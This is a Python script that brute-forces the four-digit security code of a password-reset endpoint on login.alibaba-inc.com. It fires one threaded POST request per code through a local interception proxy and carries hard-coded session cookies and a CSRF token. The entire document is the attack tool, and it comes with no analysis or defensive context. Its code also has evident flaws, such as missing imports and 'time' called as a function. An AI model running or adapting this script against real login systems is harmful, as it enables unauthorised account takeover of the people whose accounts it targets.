import requests,time

proxy = {'https':'http://127.0.0.1:8080'}
url = 'https://login.alibaba-inc.com/rpc/resetPwdByCard/resetByCard.json'
start_time = time()
def request(i,j,x,k):

    cookies = {
        '$ucn': 'center',
        'BucSsoJSESSIONID': '5FYJQ77W-4CMTWRAQXK18UCPRVLCN1-ECQ4X0UK-SSA73',
        'apdid_data': '%7B%22time%22%3A1632642402860%2C%22token%22%3A%22APDIDJS_zorro_21a9e779b1db26975e504cc82dc2aa01%22%7D',
        'cna': 'axPXGWiGDW0CAZWnpEJpJ9N1',
        'xlly_s': '1',
        'l': 'eBaFXMvggsaqSTohBO5adurza77tfIdflIFzaNbMiInca6wP_FghTOCLHzgw8dtjItfxnH-od8Leqd3WWWa_8tZDl3qbOAZPuuJw-',
        'tfstk': 'cd91BP0z5EpUBTG4QhiUuf1aA9Wla721Yc_HfIabmUs8_lKdJsAgUa9MCn4pGZjC.',
        'isg': 'BLOzbiFb1grUG5recOox5H0bQrHd6EeqYTVWCmVR6VIPZNkG_rod-DoyGo2KDp-i',
    }

    headers = {
        '$Host': 'login.alibaba-inc.com',
        '$Content-Length': '101',
        '$Sec-Ch-Ua': '\\"Chromium\\";v=\\"93\\", \\" Not;A Brand\\";v=\\"99\\"',
        '$Accept': 'application/json, text/plain, */*',
        '$Content-Type': 'application/x-www-form-urlencoded',
        '$Sec-Ch-Ua-Mobile': '?0',
        '$User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
        '$Sec-Ch-Ua-Platform': '\\"macOS\\"',
        '$Origin': 'https://login.alibaba-inc.com',
        '$Sec-Fetch-Site': 'same-origin',
        '$Sec-Fetch-Mode': 'cors',
        '$Sec-Fetch-Dest': 'empty',
        '$Referer': 'https://login.alibaba-inc.com/ssoLogin.htm?preLoginKey=NFtCdDnzCy1632642404549gFNGOKvsYl',
        '$Accept-Encoding': 'gzip, deflate',
        '$Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        '$Connection': 'close',
    }

    data = '$NOlast1=%s&NOlast2=%s&NOlast3=%s&NOlast4=%s&_sso_csrftoken_=5FYJQ77W-4CMTWRAQXK18UCPRVLCN1-ECQ4X0UK-SSA73'%(i,j,x,k)

    r = requests.post(url, headers=headers,
                             cookies=cookies, data=data, verify=False,proxies=proxy)
    security_code = str(i)+str(j)+str(x)+str(k)
    output = response_checker(r,security_code)
    return output

def response_checker(r, security_code):
    if 'ID/Passport is incorrect' in r.text:
        sys.stdout.write('\r' + 'Guesting security code: ' + security_code)
        print(time()-start_time)
        sys.stdout.flush()
    else:
        sys.stdout.write('\r' + 'correct security code: ' + security_code)
        print(time() - start_time)
        sys.stdout.flush()
        sys.exit()

def main():
    list_of_threads = []
    for i in range(0,10):
        for j in range(0,10):
            for x in range(0,10):
                for k in range(0,10):
                    new_thread = threading.Thread(target=request, args=[i,j,x,k])
                    new_thread.start()
                    list_of_threads.append(new_thread)

                for thread in list_of_threads:
                    thread.join()

if __name__ == '__main__':
    main()
